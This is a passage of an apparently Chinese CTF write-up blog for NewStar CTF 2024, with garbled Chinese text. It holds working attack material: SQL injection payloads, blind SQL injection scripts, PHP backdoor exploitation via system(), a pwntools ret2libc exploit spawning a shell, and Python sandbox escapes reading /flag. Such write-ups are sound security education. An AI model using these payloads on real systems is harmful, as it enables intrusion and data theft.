</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>sha1</span>($_GET[<span style=color:#e6db74>&#39;new&#39;</span>])<span style=color:#f92672>===</span><span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;star&#39;</span>])<span style=color:#f92672>&amp;&amp;</span>$_GET[<span style=color:#e6db74>&#39;new&#39;</span>]<span style=color:#f92672>!==</span>$_POST[<span style=color:#e6db74>&#39;star&#39;</span>]){
</span></span><span style=display:flex><span>        <span style=color:#75715e>//æ¬¸ ä¸ºå•¥sha1å’Œmd5ç›¸ç­‰å‘¢
</span></span></span><span style=display:flex><span>        $cmd <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;cmd&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/cat|flag/i&#34;</span>, $cmd)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;u can not do this &#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#66d9ef>eval</span>($cmd);
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Wrong&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>ç”¨æ•°ç»„ç»•è¿‡å°±è¡Œäº†</p><p>ç„¶åæ‰§è¡Œsystem(&rsquo;tac /f*&rsquo;)å°±å¯ä»¥äº†</p><h3 id=è°¢è°¢çš®è›‹-plus>è°¢è°¢çš®è›‹ plus</h3><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ˜¯å­—ç¬¦ç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-1<span style=color:#e6db74>&#34;/**/union/**/select/**/1,database()#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-1<span style=color:#e6db74>&#34;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-1<span style=color:#e6db74>&#34;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;Fl4g&#39;#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-1<span style=color:#e6db74>&#34;/**/union/**/select/**/1,group_concat(id,des,value)/**/from/**/Fl4g#
</span></span></span></code></pre></div><h3 id=å¤è¯»æœº>å¤è¯»æœº</h3><p>ç®€å•æµ‹è¯•äº†ä¸€ä¸‹xsså’Œsstiï¼Œå‘ç°æ˜¯sstiï¼Œä½†æ˜¯æ‰‹æµ‹ä¸å‡ºæ¥ç¦äº†ä»€ä¹ˆï¼Œfenjingä¸€æŠŠæ¢­å§</p><p><img alt=30 loading=lazy src=/posts/ctf/newstar2024/30.png></p><h3 id=pangbai-è¿‡å®¶å®¶2>PangBai è¿‡å®¶å®¶ï¼ˆ2ï¼‰</h3><p>gitæ³„éœ²æ‰¾äº†å¥½å‡ ä¸ªç‰ˆæœ¬ï¼Œç”¨https://github.com/WangYihang/GitHackerè¿™ä¸ªç‰ˆæœ¬çš„å¯ä»¥å¾—åˆ°</p><p><img alt=32 loading=lazy src=/posts/ctf/newstar2024/32.png></p><p>ä¹Ÿgitä¸‹æ¥ï¼Œgit addä¸€ä¸‹å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶BacKd0or.v2d23AOPpDfEW5Ca.php,çœ‹ä¸€ä¸‹å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Functions to handle HTML output
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>print_msg</span>($msg) {
</span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;index.html&#39;</span>);
</span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;/\s*&lt;script.*&lt;\/script&gt;/s&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $content);
</span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;/ event/&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $content);
</span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;ç‚¹å‡»æ­¤å¤„è½½å…¥å­˜æ¡£&#39;</span>, $msg, $content);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $content;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>show_backdoor</span>() {
</span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;index.html&#39;</span>);
</span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;/assets/index.4f73d116116831ef.js&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;/assets/backdoor.5b55c904b31db48d.js&#39;</span>, $content);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $content;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e># Backdoor
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_POST[<span style=color:#e6db74>&#39;papa&#39;</span>] <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;TfflxoU0ry7c&#39;</span>) {
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_backdoor</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> ($_GET[<span style=color:#e6db74>&#39;NewStar_CTF.2024&#39;</span>] <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;Welcome&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^Welcome$/&#39;</span>,
</span></span><span style=display:flex><span>$_GET[<span style=color:#e6db74>&#39;NewStar_CTF.2024&#39;</span>])) {
</span></span><span style=display:flex><span><span style=color:#a6e22e>print_msg</span>(<span style=color:#e6db74>&#39;PangBai loves you!&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>call_user_func</span>($_POST[<span style=color:#e6db74>&#39;func&#39;</span>], $_POST[<span style=color:#e6db74>&#39;args&#39;</span>]);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span><span style=color:#a6e22e>print_msg</span>(<span style=color:#e6db74>&#39;PangBai hates you!&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>åˆ†æä¸€ä¸‹getéœ€è¦å‘åŒ…çš„ä¸º</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>NewStar<span style=color:#f92672>[</span>CTF.2024<span style=color:#f92672>=</span>Welcome%0a
</span></span></code></pre></div><p>éœ€è¦è¿›è¡Œæˆªå–ï¼Œç„¶åè¿˜æœ‰ä¸ªphpç‰¹æ€§çš„é—®é¢˜</p><p>postå‘åŒ…</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>papa<span style=color:#f92672>=</span>TfflxoU0ry7c&amp;func<span style=color:#f92672>=</span>system&amp;args<span style=color:#f92672>=</span>set
</span></span></code></pre></div><p>call_user_funcæ˜¯æ„é€ å‡½æ•°ï¼ŒæŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå¾—åˆ°flag</p><p><img alt=33 loading=lazy src=/posts/ctf/newstar2024/33.png></p><h2 id=pwn-1>Pwn</h2><h3 id=ez_game>ez_game</h3><p>ç”¨checksecæ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°æ˜¯64ä½ï¼Œå¼€äº†NXä¿æŠ¤F5å¼¹å‡ºä¼ªä»£ç ï¼Œçœ‹ä¸€ä¸‹ã€‚åœ¨funcå‡½æ•°ä¸­å‘ç°æº¢å‡ºç‚¹</p><p>æ²¡æœ‰systemå­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æœ‰bin/sh,åŒæ—¶ä¹Ÿå¼€å¯äº†NXä¿æŠ¤ï¼Œè¯´æ˜æ˜¯ret2libcROPgadget &ndash;binary â€˜attachmentâ€™ &ndash;only â€˜pop|retâ€™ æŸ¥çœ‹rdiä¸retçš„åœ°å€</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>remote(<span style=color:#e6db74>&#39;101.200.139.65&#39;</span>,<span style=color:#ae81ff>30806</span>)
</span></span><span style=display:flex><span>elf<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#39;./a&#39;</span>)
</span></span><span style=display:flex><span>libc<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#39;./libc-2.31.so&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rdi<span style=color:#f92672>=</span><span style=color:#ae81ff>0x400783</span>
</span></span><span style=display:flex><span>ret<span style=color:#f92672>=</span><span style=color:#ae81ff>0x400509</span>
</span></span><span style=display:flex><span>main<span style=color:#f92672>=</span><span style=color:#ae81ff>0x400702</span>
</span></span><span style=display:flex><span>puts_plt<span style=color:#f92672>=</span>elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>puts_got<span style=color:#f92672>=</span>elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>payload1<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x58</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)<span style=color:#f92672>+</span>p64(rdi)<span style=color:#f92672>+</span>p64(puts_got)<span style=color:#f92672>+</span>p64(puts_plt)<span style=color:#f92672>+</span>p64(main)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload1)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Welcome to NewStarCTF!!!!&#39;</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>:]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>print(hex(puts_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libcbase <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>sys <span style=color:#f92672>=</span> libcbase <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>binsh <span style=color:#f92672>=</span> libcbase <span style=color:#f92672>+</span> next(libc<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(hex(libcbase))
</span></span><span style=display:flex><span>print(hex(sys))
</span></span><span style=display:flex><span>print(hex(binsh))
</span></span><span style=display:flex><span>payload2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x58</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>) <span style=color:#f92672>+</span> p64(ret) <span style=color:#f92672>+</span> p64(rdi) <span style=color:#f92672>+</span> p64(binsh) <span style=color:#f92672>+</span> p64(sys)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload2)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt=31 loading=lazy src=/posts/ctf/newstar2024/31.png></p><h1 id=week3>week3</h1><h2 id=web-2>Web</h2><h3 id=include-me>Include Me</h3><p>ç®€å•çš„ä¼ªåè®®ç»•è¿‡</p><h3 id=è‡­çš®è¸©è¸©èƒŒ>è‡­çš®è¸©è¸©èƒŒ</h3><p>è¿™æ–¹é¢å­¦çš„ä¸å¤šï¼Œå…ˆè¯•è¯•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()
</span></span></code></pre></div><p>å½“å‰ç¯å¢ƒä¸­çš„ <code>__subclasses__()</code> è¿”å›äº†è®¸å¤šç±»ï¼Œæœ‰ç‚¹ç±»ä¼¼sstiçš„è¿‡ç¨‹ï¼Œè¯•è¯•132å¯ä»¥</p><p>æœ€åæ„é€ payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>132</span>]<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;popen&#39;</span>](<span style=color:#e6db74>&#39;cat /flag&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span></code></pre></div><p><img alt=37 loading=lazy src=/posts/ctf/newstar2024/37.png></p><h3 id=è‡­çš®çš„è®¡ç®—æœº>è‡­çš®çš„è®¡ç®—æœº</h3><p>ä¸€å¼€å§‹åœ¨æƒ³å¼‚æˆ–æˆ–è€…æ¡ä»¶ç«äº‰ï¼Œå›å®¿èˆçªç„¶çµæœºä¸€åŠ¨æƒ³å‡ºæ¥äº†</p><p>å…«è¿›åˆ¶è¿›è¡Œè½¬åŒ–</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\143\141\164\040\057\146\154\141\147\047\051
</span></span></code></pre></div><p>å¯¹åº”çš„è¯­å¥æ˜¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>__import__(<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;cat /flag&#39;</span>)
</span></span></code></pre></div><h3 id=blindsql1å¤ç°>blindsql1(å¤ç°)</h3><p>ä¸€ç›´åœ¨ç­‰å®˜pï¼Œæˆ‘æƒ³åˆ°çš„æ—¶é—´ç›²æ³¨ä¸€ç›´æ³¨ä¸å‡ºæ¥ï¼Œæƒ³æ‹¿åˆ°å®˜påˆ†æä¸€ä¸‹ï¼Œå…ˆä¸Šæˆ‘çš„exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>dicts <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_letters<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;_&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;-&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#dicts = &#39;0123456789abcdefghijklmnopqrstuvwxyz-_{},&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2ze6bhm7y89n414z4qi0.cloudeci1.ichunqiu.com/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_flag_char</span>(index):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> dicts:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;-1&#39;||(if(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),</span><span style=color:#e6db74>{</span>index<span style=color:#e6db74>}</span><span style=color:#e6db74>,1)like(&#39;</span><span style=color:#e6db74>{</span>char<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style=display:flex><span>         <span style=color:#75715e># åº“åæ˜¯students_courses_secrets</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;-1&#39;||(if(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(736563726574735F636F75727365735F73747564656E7473))),{index},1)like(&#39;{char}&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;student_name&#39;</span>: payload}
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            start_time <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>url, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>            end_time <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
</span></span><span style=display:flex><span>            sub <span style=color:#f92672>=</span> end_time <span style=color:#f92672>-</span> start_time
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> sub <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0.5</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> char
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>RequestException <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;è¯·æ±‚å¤±è´¥: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>    char <span style=color:#f92672>=</span> get_flag_char(i)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> char:
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>+=</span> char
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;å½“å‰æƒ…å†µ: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;å·²ç»“æŸ&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;æœ€ç»ˆæƒ…å†µ: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>ä¸Šä¸€ä¸‹å®˜på§æ–¹æ³•å…¶å®ç±»ä¼¼</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span>string<span style=color:#f92672>,</span>time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2ze6bhm7y89omu7vsmgr.cloudeci1.ichunqiu.com/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>100</span>):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] Bruting at </span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string<span style=color:#f92672>.</span>ascii_letters <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;,_-</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;</span>:
</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.01</span>) <span style=color:#75715e># é™åˆ¶é€Ÿç‡ï¼Œé˜²æ­¢è¯·æ±‚è¿‡å¿«</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;[+] Trying:&#39;</span>, c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        tables <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>flag%</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>)))&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        char <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;(ord(mid(</span><span style=color:#e6db74>{</span>tables<span style=color:#e6db74>}</span><span style=color:#e6db74>,</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1)))&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># çˆ†ç ´è¯¥ ascii å€¼</span>
</span></span><span style=display:flex><span>        b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;((</span><span style=color:#e6db74>{</span>char<span style=color:#e6db74>}</span><span style=color:#e6db74>)in(</span><span style=color:#e6db74>{</span>ord(c)<span style=color:#e6db74>}</span><span style=color:#e6db74>))&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># è‹¥ ascii çŒœå¯¹äº†ï¼Œåˆ™ and åé¢çš„ç»“æœæ˜¯ trueï¼Œä¼šè¿”å› Alice çš„æ•°æ®</span>
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Alice</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>and(</span><span style=color:#e6db74>{</span>b<span style=color:#e6db74>}</span><span style=color:#e6db74>)#&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, params<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;student_name&#39;</span>: p})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Alice&#39;</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#39;[*]bingo:&#39;</span>,c)
</span></span><span style=display:flex><span>            result <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>            print(result)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><p>å…·ä½“æˆ‘çš„ä»£ç è®²è§£å¯ä»¥çœ‹sql2çš„æˆ‘çš„å†™æ³•</p><h3 id=è¿™ç…§ç‰‡æ˜¯ä½ å—å¤ç°>è¿™â€œç…§ç‰‡â€æ˜¯ä½ å—(å¤ç°)</h3><p>å†™è¿™é¢˜çš„æ—¶å€™å®Œå…¨æ²¡æ€è·¯ï¼ŒåŸºç¡€åŠŸåº•å¤ªå·®äº†ï¼Œè·Ÿç€å®˜på¤ç°ä¸€ä¸‹ï¼Œå…ˆçœ‹æºç çš„hint</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>&lt;!-- å›¾æ ‡èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºè€¶! --&gt;
</span></span><span style=display:flex><span>&lt;!-- ä½†æ˜¯æˆ‘å¥½åƒæ²¡æœ‰çœ‹åˆ°Nginxæˆ–è€…Apacheä¹‹ç±»çš„ä¸œè¥¿ --&gt;
</span></span><span style=display:flex><span>&lt;!-- è¯´æ˜æœåŠ¡å™¨è„šæœ¬èƒ½å¤Ÿå¤„ç†é™æ€æ–‡ä»¶æ --&gt;
</span></span><span style=display:flex><span>&lt;!-- é‚£æºç æ˜¯ä¸æ˜¯å¯ä»¥ç”¨æŸäº›åŠæ³•æ‹¿åˆ°å‘¢! --&gt;
</span></span></code></pre></div><p>èƒ½è·å–è·¯ç”±ä½†æ˜¯æ²¡æœ‰ä¸­é—´ä»¶æ¥æ”¯æŒï¼ŒæœåŠ¡ç«¯å¤„ç†æ–‡ä»¶å’Œè·¯ç”±çš„é€»è¾‘å¾ˆæœ‰å¯èƒ½ä¼šæœ‰æ¼æ´ã€‚wappalyzerå¯ä»¥å‘ç°æ˜¯<code>flask</code>çš„æ¡†æ¶ï¼Œæµ‹è¯•äº†ä¸€ä¸‹æ˜¯ç”¨ç›®å½•ç©¿è¶Šçš„æ¼æ´çš„</p><p><img alt=49 loading=lazy src=/posts/ctf/newstar2024/49.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, make_response, render_template_string, request, redirect, send_file
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
